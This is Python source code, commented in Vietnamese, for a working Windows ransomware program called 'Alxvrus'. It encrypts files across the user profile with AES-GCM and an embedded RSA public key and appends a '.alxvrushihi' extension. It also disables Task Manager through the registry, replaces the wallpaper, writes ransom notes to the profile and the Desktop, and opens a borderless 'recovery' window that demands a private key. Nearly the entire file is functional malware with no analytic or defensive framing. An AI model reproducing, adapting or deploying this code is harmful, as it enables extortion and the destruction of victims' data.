import os
import threading
import queue
import ctypes
import winreg
import sys
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import tkinter as tk
from tkinter import filedialog, messagebox

# --- 0. Hỗ trợ tài nguyên ---
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- 1. Cấu hình Hệ thống ---
rsa_mtx = threading.Lock()
path_anh_nen = resource_path("logo.png") 

def vo_hieu_hoa_taskmgr(status=1):
    try:
        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, status)
        winreg.CloseKey(key)
        return True
    except: return False

def thiet_lap_hinh_nen(path_anh):
    if not os.path.exists(path_anh): return
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(path_anh), 3)
    except: pass

def tao_readme(target_dir):
    readme_path = os.path.join(target_dir, "README_RECOVERY.txt")
    content = """
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:                                                                           :

:                      !!! ALL YOUR FILES ARE ENCRYPTED !!!                 :

:                                                                           :

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::



[+] CHUYỆN GÌ ĐÃ XẢY RA?
Toàn bộ các tài liệu quan trọng, ảnh, video và dữ liệu của bạn đã bị mã hóa 

bằng thuật toán AES-GCM quân sự và khóa RSA-256. Bạn sẽ không thể mở các 

tệp tin này theo cách thông thường.



[+] LÀM SAO ĐỂ KHÔI PHỤC DỮ LIỆU?

Để giải mã các tệp tin, bạn cần một tệp tin khóa riêng (private_key.pem) 

duy nhất tương ứng với máy tính của bạn. 



Vui lòng làm theo các bước sau:

1. Đừng cố gắng thay đổi tên tệp hoặc dùng phần mềm bên thứ ba để sửa lỗi, 

   điều đó có thể làm hỏng dữ liệu vĩnh viễn.

2. Liên hệ với quản trị viên hệ thống để nhận file giải mã.

3. Mở ứng dụng "Alxvrus Recovery Tool" hiện đang chạy trên màn hình.

4. Chọn file 'private_key.pem' đã nhận và nhấn "GIẢI MÃ NGAY".



[+] THÔNG TIN LIÊN HỆ:

Email: [Địa chỉ email của bạn hoặc ID Telegram]

Mã định danh máy: %COMPUTERNAME%_%USERNAME%



---

CẢNH BÁO: Nếu bạn tắt ứng dụng hoặc cố tình can thiệp vào tiến trình, 

chúng tôi không đảm bảo dữ liệu của bạn có thể khôi phục được."""
    try:
        with open(readme_path, "w", encoding="utf-8") as f:
            f.write(content)
        return True
    except: return False

# --- 2. Quản lý Hàng đợi & Mã hóa ---
class BoundedQueue:
    def __init__(self, size):
        self.q = queue.Queue(maxsize=size)
        self.done = False
    def push(self, item):
        if not self.done: self.q.put(item)
    def pop(self):
        try: return self.q.get(timeout=1)
        except queue.Empty: return None

def EncryptFile(path, rsa_pub):
    try:
        if path.endswith(".alxvrushihi") or os.path.getsize(path) > 50*1024*1024: 
            return
        with open(path, 'rb') as f: buffer = f.read()
        aes_key, nonce = os.urandom(32), os.urandom(12)
        with rsa_mtx:
            ek = rsa_pub.encrypt(aes_key, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        ctx = encryptor.update(buffer) + encryptor.finalize()
        with open(path, 'wb') as f:
            f.write(ek + nonce + encryptor.tag + ctx)
        os.rename(path, path + ".alxvrushihi")
    except: pass

def SecureScanner(target, q_obj):
    for root, _, files in os.walk(target):
        for file in files:
            if file.endswith((".exe", ".dll", ".sys", ".pem", ".lnk", ".ini", ".txt")): continue
            q_obj.push(os.path.join(root, file))
    q_obj.done = True

# --- 3. Giao diện Giải mã ---
class DecryptorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Alxvrus Recovery Tool")
        self.root.geometry("500x450")
        self.root.configure(bg="#2c3e50")
        root.overrideredirect(True) 
        
        tk.Label(root, text="DỮ LIỆU ĐÃ BỊ KHÓA", fg="#e74c3c", bg="#2c3e50", font=("Arial", 16, "bold")).pack(pady=20)
        self.lbl_status = tk.Label(root, text="Chưa chọn file key", fg="#f1c40f", bg="#2c3e50")
        self.lbl_status.pack()
        
        tk.Button(root, text="Chọn Private Key (.pem)", command=self.browse_file).pack(pady=10)
        self.btn_decrypt = tk.Button(root, text="GIẢI MÃ NGAY", bg="#27ae60", fg="white", font=("Arial", 12, "bold"), width=20, command=self.start_decryption)
        self.btn_decrypt.pack(pady=30)
        self.selected_pem_path = ""

    def browse_file(self):
        path = filedialog.askopenfilename(filetypes=[("PEM files", "*.pem")])
        if path:
            self.selected_pem_path = path
            self.lbl_status.config(text=f"Đã chọn: {os.path.basename(path)}")

    def start_decryption(self):
        if not self.selected_pem_path: return
        self.btn_decrypt.config(state="disabled", text="Đang xử lý...")
        threading.Thread(target=self.run_decryption, daemon=True).start()

    def run_decryption(self):
        try:
            with open(self.selected_pem_path, "rb") as f:
                priv_key = serialization.load_pem_private_key(f.read(), password=None)
            target = os.environ["USERPROFILE"]
            count = 0
            for root, _, files in os.walk(target):
                for file in files:
                    if file.endswith(".alxvrushihi"):
                        if self.decrypt_file(os.path.join(root, file), priv_key): count += 1
            vo_hieu_hoa_taskmgr(0)
            messagebox.showinfo("Xong", f"Đã khôi phục {count} file!")
            self.root.destroy()
        except:
            messagebox.showerror("Lỗi", "Key không đúng!")
            self.btn_decrypt.config(state="normal", text="GIẢI MÃ NGAY")

    def decrypt_file(self, file_path, priv_key):
        try:
            # 1. Đọc dữ liệu mã hóa
            with open(file_path, 'rb') as f:
                ek = f.read(256)      # Đọc 256 bytes đầu cho RSA encrypted key
                nonce = f.read(12)   # Đọc 12 bytes tiếp theo cho AES nonce
                tag = f.read(16)     # Đọc 16 bytes tiếp theo cho AES-GCM tag
                ctx = f.read()
            
            # 2. Giải mã AES Key bằng RSA Private Key
            aes_key = priv_key.decrypt(
                ek, 
                padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
            )
            
            # 3. Giải mã nội dung bằng AES-GCM
            cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce, tag), backend=default_backend())
            data = cipher.decryptor().update(ctx) + cipher.decryptor().finalize()
            
            # 4. Ghi đè lại file cũ (bỏ đuôi .alxvrushihi)
            original_path = file_path.rsplit(".alxvrushihi", 1)[0]
            with open(original_path, 'wb') as f: 
                f.write(data)
                
            # 5. Xóa file mã hóa sau khi đã giải mã xong
            os.remove(file_path)
            return True
        except Exception as e:
            print(f"Lỗi giải mã file {file_path}: {e}")
            return False

# --- 4. Thực thi ---
def start_encryption_process():
    pub_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuTSFZcQrlH6+J/Bvic6k
1mGmoBQFXkteag987WQhb3bBdkrJPhy+GR+E0ruBYw387ePVA4w0ymP6MwsKZDV+
17pk77sOZjtCVGqEQZcg1ZV5eRrJ3erY/IHQqhRu+wv21dto3RhRkKucoG2A6kJh
r6F9hA10ahXk1WMq5Nc5q7iahi2iQUOU+vd3B3qZMPZlASfOt/4S0lL0EkExqVRf
ZuEaTYPEMO7zzH9OThztES4ZyaWceh2LW4Aif6eoc8thCHC8arGl1uf9Qmvp/UET
02zxKco0u+DmkaMHB2hy4xu70T/V1hq/bQaPuFevk5J98rSvPWj8QTCw3SipaAqw
/QIDAQAB
-----END PUBLIC KEY-----"""
    rsa_pub = serialization.load_pem_public_key(pub_pem)
    q = BoundedQueue(2000)
    
    def worker():
        while not q.done or not q.q.empty():
            p = q.pop()
            if p: EncryptFile(p, rsa_pub)

    for _ in range(4): threading.Thread(target=worker, daemon=True).start()
    threading.Thread(target=SecureScanner, args=(os.environ["USERPROFILE"], q), daemon=True).start()
    
    thiet_lap_hinh_nen(path_anh_nen)
    vo_hieu_hoa_taskmgr(1)

if __name__ == "__main__":
    # GỌI ĐẦU TIÊN ĐỂ TẠO FILE NGAY LẬP TỨC
    up = os.environ.get("USERPROFILE")
    if up:
        tao_readme(up)
        # Tạo thêm 1 bản ngoài Desktop cho chắc chắn
        tao_readme(os.path.join(up, "Desktop"))

    # Chạy tiến trình mã hóa ngầm
    start_encryption_process()
    
    # Khởi tạo GUI
    root = tk.Tk()
    # Căn giữa màn hình
    w, h = 500, 450
    root.geometry(f"{w}x{h}+{(root.winfo_screenwidth()-w)//2}+{(root.winfo_screenheight()-h)//2}")
    app = DecryptorGUI(root)
    root.mainloop()
